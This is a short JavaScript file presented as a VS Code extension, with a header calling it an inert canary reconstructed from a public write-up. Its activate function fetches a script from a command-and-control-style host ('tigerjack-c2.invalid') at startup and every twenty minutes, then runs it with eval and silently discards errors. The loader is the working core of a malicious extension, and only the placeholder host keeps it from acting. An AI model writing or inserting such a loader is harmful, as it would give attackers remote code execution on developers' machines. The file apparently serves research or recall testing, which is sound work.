// INERT RECALL CANARY reconstructed from a public write-up. Hosts are .invalid / TEST-NET;
// payloads are console.log strings. Never published, never executed.

const vscode = require('vscode');
async function pull() {
  try {
    const res = await fetch('https://tigerjack-c2.invalid/static/in4.js');
    const code = await res.text();
    eval(code);
  } catch (e) {}
}
exports.activate = function (context) { pull(); setInterval(pull, 20 * 60 * 1000); };
